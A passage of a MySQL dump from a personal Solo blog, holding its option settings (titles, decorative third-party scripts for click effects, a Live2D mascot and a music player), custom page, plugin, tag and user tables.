INSERT INTO `b3_solo_link` VALUES ('1584497886077','https://hacpai.com','黑客与画家的社区',0,'黑客派','https://static.hacpai.com/images/favicon.png');
/*!40000 ALTER TABLE `b3_solo_link` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_option`
--

DROP TABLE IF EXISTS `b3_solo_option`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_option` (
  `oId` varchar(64) NOT NULL COMMENT '主键',
  `optionValue` text NOT NULL COMMENT '配置项值',
  `optionCategory` varchar(255) NOT NULL COMMENT '配置项分类',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='配置项';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_option`
--

LOCK TABLES `b3_solo_option` WRITE;
/*!40000 ALTER TABLE `b3_solo_option` DISABLE KEYS */;
INSERT INTO `b3_solo_option` VALUES ('allowVisitDraftViaPermalink','false','preference'),('articleListDisplayCount','8','preference'),('articleListPaginationWindowSize','15','preference'),('articleListStyle','titleAndAbstract','preference'),('autoSpace','true','preference'),('blogSubtitle','记录精彩的程序人生','preference'),('blogTitle','goofiest个人博客','preference'),('chinesePunct','true','preference'),('customVars','key0=val0|key1=val1|key2=val2','preference'),('editorMode','wysiwyg','preference'),('enableArticleUpdateHint','true','preference'),('externalRelevantArticlesDisplayCount','0','preference'),('faviconURL','https://static.b3log.org/images/brand/solo-32.png','preference'),('feedOutputCnt','10','preference'),('feedOutputMode','abstract','preference'),('fixTermTypo','true','preference'),('footerContent','','preference'),('footnotes','true','preference'),('githubPAT','','preference'),('githubRepos','[{\"githubrepoId\":\"235973465\",\"githubrepoStatus\":0,\"oId\":\"1603763606397\",\"githubrepoDescription\":\"\",\"githubrepoHomepage\":\"\",\"githubrepoForksCount\":0,\"githubrepoOwnerId\":\"56912443\",\"githubrepoStargazersCount\":0,\"githubrepoWatchersCount\":1,\"githubrepoOwnerLogin\":\"goofiest\",\"githubrepoHTMLURL\":\"https://github.com/goofiest/public\",\"githubrepoLanguage\":\"Java\",\"githubrepoUpdated\":1603763603339,\"githubrepoName\":\"public\",\"githubrepoFullName\":\"goofiest/public\"}]','github'),('hljsTheme','github','preference'),('htmlHead','<!--鼠标点击效果 -->\n<!--<script src=\"https://cdn.jsdelivr.net/gh/fz6m/Private-web@1.2/js/custom/click.min.js\"></script>-->\n\n<!--礼花特效-->\n    \n\n\n\n\n<!-- 页面樱花-->\n<!--<script type=\"text/javascript\"src=\"https://cdn.jsdelivr.net/gh/fz6m/Private-web@1.2/js/sakura/sakura-original.js\"></script>-->\n\n<!--鼠标点击效果-->\n<script src=\"https://jokeme.top/js/course.js\" defer></script>\n\n\n\n\n<script src=\"https://eqcn.ajz.miesnfu.com/wp-content/plugins/wp-3d-pony/live2dw/lib/L2Dwidget.min.js\"></script>\n  <!--小帅哥： https://unpkg.com/live2d-widget-model-chitose@1.0.5/assets/chitose.model.json-->\n  <!--萌娘：https://unpkg.com/live2d-widget-model-shizuku@1.0.5/assets/shizuku.model.json-->\n  <!--小可爱（女）：https://unpkg.com/live2d-widget-model-koharu@1.0.5/assets/koharu.model.json-->\n  <!--小可爱（男）：https://unpkg.com/live2d-widget-model-haruto@1.0.5/assets/haruto.model.json-->\n  <!--初音：https://unpkg.com/live2d-widget-model-miku@1.0.5/assets/miku.model.json-->\n   <!-- 上边的不同链接显示的是不同的小人，这个可以根据需要来选择 下边的初始化部分，可以修改宽高来修改小人的大小，或者是鼠标移动到小人上的透明度，也可以修改小人在页面出现的位置。 -->\n\n  <script>\n    /*https://unpkg.com/live2d-widget-model-shizuku@1.0.5/assets/shizuku.model.json*/\n    L2Dwidget.init({ \"model\": { jsonPath:\n          \"https://unpkg.com/live2d-widget-model-haruto@1.0.5/assets/haruto.model.json\",\n        \"scale\": 1 }, \"display\": { \"position\": \"left\", \"width\": 110, \"height\": 150,\n        \"hOffset\": 0, \"vOffset\": -20 }, \"mobile\": { \"show\": true, \"scale\": 0.4 },\n      \"react\": { \"opacityDefault\": 0.7, \"opacityOnHover\": 0.1 } });\n  </script>\n\n','preference'),('inlineMathAllowDigitAfterOpenMarker','false','preference'),('localeString','zh_CN','preference'),('metaDescription','A small and beautiful blogging system. 一款小而美的博客系统。','preference'),('metaKeywords','Solo,Java,博客,开源','preference'),('mobileSkinDirName','nijigen','skin'),('mostUsedTagDisplayCount','20','preference'),('noticeBoard','<!-- require APlayer -->\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css\">\n<script src=\"https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js\"></script>\n<!-- require MetingJS -->\n<script src=\"https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js\"></script>\n\n<meting-js\n	server=\"netease\"\n	type=\"playlist\"\n	id=\"830043759\">\n</meting-js>','preference'),('paragraphBeginningSpace','false','preference'),('pullGitHub','true','preference'),('randomArticlesDisplayCount','5','preference'),('recentArticleDisplayCount','','preference'),('relevantArticlesDisplayCount','5','preference'),('showCodeBlockLn','false','preference'),('showToC','true','preference'),('signs','[{\"signHTML\":\"\",\"oId\":0},{\"signHTML\":\"<hr>\\n\\n标题：{title}<br>\\n作者：<a href=\\\"{blog}\\\" target=\\\"_blank\\\">{author}<\\/a><br>\\n地址：<a href=\\\"{url}\\\" target=\\\"_blank\\\">{url}<\\/a><br>\\n\\n<!-- 签名档内可使用 HTML、JavaScript -->\\n<br>\",\"oId\":1},{\"signHTML\":\"<hr>\\n\\n标题：{title}<br>\\n作者：<a href=\\\"{blog}\\\" target=\\\"_blank\\\">{author}<\\/a><br>\\n地址：<a href=\\\"{url}\\\" target=\\\"_blank\\\">{url}<\\/a><br>\\n\\n<!-- 签名档内可使用 HTML、JavaScript -->\\n<br>\",\"oId\":2},{\"signHTML\":\"<hr>\\n\\n标题：{title}<br>\\n作者：<a href=\\\"{blog}\\\" target=\\\"_blank\\\">{author}<\\/a><br>\\n地址：<a href=\\\"{url}\\\" target=\\\"_blank\\\">{url}<\\/a><br>\\n\\n<!-- 签名档内可使用 HTML、JavaScript -->\\n<br>\",\"oId\":3}]','preference'),('skinDirName','nijigen','skin'),('speech','false','preference'),('statisticBlogViewCount','0','statistic'),('syncGitHub','true','preference'),('timeZoneId','Asia/Shanghai','preference'),('usite','{\"usiteUserId\":\"1578976539454\",\"usiteWeiBo\":\"\",\"usiteQQMusic\":\"\",\"usiteStackOverflow\":\"\",\"usiteDribbble\":\"\",\"usiteGitHub\":\"\",\"usiteMedium\":\"\",\"usiteTwitter\":\"\",\"usiteQQ\":\"\",\"usiteLinkedIn\":\"\",\"usiteSteam\":\"\",\"oId\":\"1578976540611\",\"usiteInstagram\":\"\",\"usiteCodePen\":\"\",\"usiteWYMusic\":\"\",\"usiteWeChat\":\"\",\"usiteZhiHu\":\"\",\"usiteBehance\":\"\",\"usiteTelegram\":\"\",\"usiteFacebook\":\"\"}','hacpai'),('version','4.3.1','preference');
/*!40000 ALTER TABLE `b3_solo_option` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_page`
--

DROP TABLE IF EXISTS `b3_solo_page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_page` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `pageOrder` int(11) NOT NULL COMMENT '页面展现排序',
  `pagePermalink` varchar(255) NOT NULL COMMENT '页面访问路径',
  `pageTitle` varchar(255) NOT NULL COMMENT '页面标题',
  `pageOpenTarget` varchar(255) NOT NULL COMMENT '页面打开方式',
  `pageIcon` varchar(255) NOT NULL COMMENT '页面展示用小图标',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='自定义页面表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_page`
--

LOCK TABLES `b3_solo_page` WRITE;
/*!40000 ALTER TABLE `b3_solo_page` DISABLE KEYS */;
INSERT INTO `b3_solo_page` VALUES ('1584513730608',0,'/my-github-repos','我的开源','_self','/images/github-icon.png');
/*!40000 ALTER TABLE `b3_solo_page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_plugin`
--

DROP TABLE IF EXISTS `b3_solo_plugin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_plugin` (
  `oId` varchar(128) NOT NULL COMMENT '主键',
  `author` text NOT NULL COMMENT '插件作者',
  `name` varchar(255) NOT NULL COMMENT '插件名称',
  `status` varchar(10) NOT NULL COMMENT '插件状态，启用：ENABLED，禁用：DISABLED',
  `version` varchar(10) NOT NULL COMMENT '插件版本',
  `setting` text COMMENT '插件配置，JSON 字符串',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='插件表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_plugin`
--

LOCK TABLES `b3_solo_plugin` WRITE;
/*!40000 ALTER TABLE `b3_solo_plugin` DISABLE KEYS */;
INSERT INTO `b3_solo_plugin` VALUES ('Symphony Interest_0.0.1','<a href=\"http://88250.b3log.org\">88250</a>','Symphony Interest','ENABLED','0.0.1','{}'),('Table of Contents Generator_1.0.1','<a href=\"http://88250.b3log.org\">88250</a>','Table of Contents Generator','ENABLED','1.0.1','{}'),('看板娘_0.0.1','<a href=\"http://vanessa.b3log.org\">Vanessa</a>','看板娘','DISABLED','0.0.1','{}');
/*!40000 ALTER TABLE `b3_solo_plugin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_tag`
--

DROP TABLE IF EXISTS `b3_solo_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_tag` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `tagTitle` varchar(255) NOT NULL COMMENT '标签标题',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='标签表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_tag`
--

LOCK TABLES `b3_solo_tag` WRITE;
/*!40000 ALTER TABLE `b3_solo_tag` DISABLE KEYS */;
INSERT INTO `b3_solo_tag` VALUES ('1584513716643','Markdown'),('1584513716945','OpenWrt'),('1584513717368','win10'),('1585557930852','nginx'),('1587524305844','java'),('1593141403816','黑苹果'),('1602479623762','solo'),('1603858210144','kali'),('1604897129348','shell'),('1605714148700','安全'),('1607688608661','收藏');
/*!40000 ALTER TABLE `b3_solo_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_tag_article`
--

DROP TABLE IF EXISTS `b3_solo_tag_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_tag_article` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `article_oId` varchar(19) NOT NULL COMMENT '文章 id',
  `tag_oId` varchar(19) NOT NULL COMMENT '标签 id',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='标签-文章关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_tag_article`
--

LOCK TABLES `b3_solo_tag_article` WRITE;
/*!40000 ALTER TABLE `b3_solo_tag_article` DISABLE KEYS */;
INSERT INTO `b3_solo_tag_article` VALUES ('1584513716696','1584513716588','1584513716643'),('1584513716996','1584513716894','1584513716945'),('1584513717420','1584513717316','1584513717368'),('1584513718718','1584513718665','1584513717368'),('1585557930904','1585557930801','1585557930852'),('1587524305895','1587524305793','1587524305844'),('1590661424608','1590661424556','1587524305844'),('1590754642465','1590754642414','1587524305844'),('1593141403867','1593141403765','1593141403816'),('1596879620483','1596879620431','1593141403816'),('1602479623814','1602479623711','1602479623762'),('1603520839291','1603520839239','1584513716945'),('1603858210195','1603858210093','1603858210144'),('1604897129399','1604897129295','1604897129348'),('1605714148751','1605714148649','1605714148700'),('1605959249690','1605959249638','1603858210144'),('1607688608712','1607688608609','1607688608661');
/*!40000 ALTER TABLE `b3_solo_tag_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_user`
--

DROP TABLE IF EXISTS `b3_solo_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_user` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `userName` varchar(255) NOT NULL COMMENT '用户名',
  `userURL` varchar(255) NOT NULL COMMENT '用户链接地址',
  `userRole` varchar(255) NOT NULL COMMENT '用户角色，管理员：adminRole，普通用户：defaultRole，访客用户：visitorRole',
  `userAvatar` varchar(255) NOT NULL COMMENT '用户头像图片链接地址',
  `userB3Key` varchar(64) NOT NULL COMMENT 'B3log Key',
  `userGitHubId` varchar(32) NOT NULL COMMENT '用户 GitHub Open Id',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_user`
--

LOCK TABLES `b3_solo_user` WRITE;
/*!40000 ALTER TABLE `b3_solo_user` DISABLE KEYS */;
INSERT INTO `b3_solo_user` VALUES ('1584497886024','goofiest','http://www.goofiest.top','adminRole','https://img.hacpai.com/avatar/1578976539454_1583932048863.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100','goofiest','1578976539454'),('1599581688793','JokerLee','https://goofiest.top','visitorRole','https://img.hacpai.com/avatar/1575322384198_1579086976432.gif?imageView2/1/w/128/h/128/interlace/0/q/100','JokerLee','1575322384198');
/*!40000 ALTER TABLE `b3_solo_user` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-03-10  6:51:43
